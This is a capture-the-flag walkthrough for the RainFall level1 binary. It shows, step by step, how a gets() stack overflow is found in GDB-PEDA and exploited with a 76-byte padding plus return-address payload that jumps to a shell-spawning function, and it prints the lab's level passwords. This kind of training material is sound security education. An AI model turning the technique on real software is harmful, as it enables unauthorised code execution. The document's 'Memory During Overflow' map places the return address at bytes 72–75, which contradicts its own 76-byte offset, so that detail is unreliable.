# RainFall CTF – Level1 Full Detailed Walkthrough


## 1. Initial Setup

Log in as level1 and download the binary:

```bash
su level1 53a4a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
scp -P 4242 -r level1@10.13.249.218:/home/user/level1/level1 .
```

Start GDB with PEDA:

```bash
gdb-peda ./level1
```

---

## 2. Enumerate Functions

Inside GDB:

```gdb
info functions
```

Relevant output:

```
0x08048444  run
0x08048480  main
0x08048340  gets@plt
0x08048360  system@plt
0x08048350  fwrite@plt
```

**Observations:**

- `main` uses `gets()` → **vulnerable to buffer overflow**.
- `run` calls `system("/bin/sh")` → target function.
- `fwrite` prints `"Good... Wait what?"`.

> **Important:** Addresses like `0x08048444` are **virtual memory addresses** assigned when the binary is loaded. They are not literal constants in the file.

---

## 3. Disassemble `main` and Analyze Stack

```gdb
disassemble main
```

Output:

```
0x08048480 <+0>: push   %ebp
0x08048481 <+1>: mov    %esp,%ebp
0x08048483 <+3>: and    $0xfffffff0,%esp
0x08048486 <+6>: sub    $0x50,%esp
0x08048489 <+9>: lea    0x10(%esp),%eax
0x0804848d <+13>: mov %eax,(%esp)
0x08048490 <+16>: call 0x8048340 <gets@plt>
0x08048495 <+21>: leave
0x08048496 <+22>: ret
```

### Stack Layout Explanation

When `main()` runs:

```
Higher addresses
+-------------------+
| Return Address    | <- overwritten to jump to run()
+-------------------+
| Saved EBP         |
+-------------------+
| Local Buffer      | <- 64 bytes allocated (0x50 - 0x10)
+-------------------+
Lower addresses
```

- `sub $0x50, %esp` → allocates **80 bytes**.
- `lea 0x10(%esp), %eax` → buffer starts at `esp + 0x10`.
- **Buffer size** = 0x50 - 0x10 = **64 bytes**.
- **Vulnerability:** `gets()` reads **unbounded input**, so writing >64 bytes overflows **saved EBP** and then **return address (EIP)**.

---

## 4. Disassemble `run` and Find System Call

```gdb
disassemble run
```

Output snippet:

```
0x08048444 <+0>: push   %ebp
0x08048445 <+1>: mov    %esp,%ebp
...
0x08048479 <+53>: call 0x8048360 <system@plt>
```

- Start of function = **0x08048444**
- Inside, it prints `"Good... Wait what?"` and executes `system("/bin/sh")`.
- **This is the function we want to jump to.**

> **Note:** We know the function’s address from `info functions` or `p run` in GDB. It is **not stored literally in the binary**, it is the **virtual memory address** after the binary is loaded.

---

## 5. Find Exact Overflow Offset

Generate a cyclic pattern in PEDA:

```gdb
gdb-peda$ pattern create 100
```

Run the program with it:

```gdb
gdb-peda$ run
```

Program crashes (`SIGSEGV`). Inspect registers:

```
EIP: 0x41344141 ('AA4A')
EBP: 0x65414149 ('IAAe')
ESP: 0xffffcdc0 ("AJAAfAA5AAKAAgAA6AAL")
```

Search for pattern in memory:

```gdb
gdb-peda$ pattern search
```

Output:

```
EBP+0 found at offset: 72
EIP+0 found at offset: 76
```

### Memory Analysis

- First 64 bytes → buffer
- Next 4 bytes → saved EBP
- Next 4 bytes → **return address (EIP)**

So **offset to return address** = 76 bytes.

---

## 6. Crafting the Exploit

Payload structure:

```
[A * 76][RET address = run()]
```

- RET address = `0x08048444` → **little-endian** = `\x44\x84\x04\x08`
- Python 2 payload:

```bash
python -c 'print "A"*76 + "\x44\x84\x04\x08"' > /tmp/input
```

**Memory During Overflow:**

```
[0..63]   -> buffer
[64..67]  -> saved EBP (can be junk)
[68..71]  -> padding/alignment
[72..75]  -> EIP overwritten → CPU jumps to run()
```

---

## 7. Execute Exploit Properly

```bash
cat /tmp/input - | ./level1
```

- `-` keeps stdin open → `system("/bin/sh")` can run.
- Output:

```
Good... Wait what?
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

```

---

### Why Without `-` It Fails

```bash
cat /tmp/input | ./level1
```

- stdin closes immediately.
- `system("/bin/sh")` cannot read → exits → program segfaults.
- Only `"Good... Wait what?"` is printed.

---

## 8. Level2 Password

```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

---

## 9. Key Points Summary

- **Vulnerability:** `gets()` → unbounded input → stack overflow
- **Offset:** 76 bytes to reach EIP
- **Target:** `run()` at `0x08048444`
- **Payload:** `"A"*76 + "\x44\x84\x04\x08"`
- **Execution:** `cat /tmp/input - | ./level1`
- **Registers/Memory:** Buffer fills stack → EBP overwritten → EIP overwritten → CPU jumps to `run()`

---
